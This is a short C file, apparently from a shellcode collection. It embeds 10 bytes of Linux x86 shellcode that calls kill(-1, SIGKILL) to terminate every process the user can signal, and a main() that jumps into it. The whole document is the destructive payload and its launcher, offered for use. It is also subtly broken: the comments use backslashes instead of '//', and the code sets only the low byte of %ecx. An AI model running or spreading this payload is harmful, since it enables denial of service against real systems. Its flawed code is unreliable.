// linux/x86 kill(-1, SIGKILL) - 10 bytes
// Febriyanto Nugroho
 
#include <stdio.h>
 
char shellcode[] = "\x6a\x25"   \\ push   $0x25
                   "\x58"       \\ pop    %eax
                   "\x6a\xff"   \\ push   $0xffffffff # 1
                   "\x5b"       \\ pop    %ebx
                   "\xb1\x09"   \\ mov    $0x9,%cl
                   "\xcd\x80";  \\ int    $0x80
 
int main(int argc, char **argv) {
    asm("jmp %0;" : "=m" (shellcode));
}
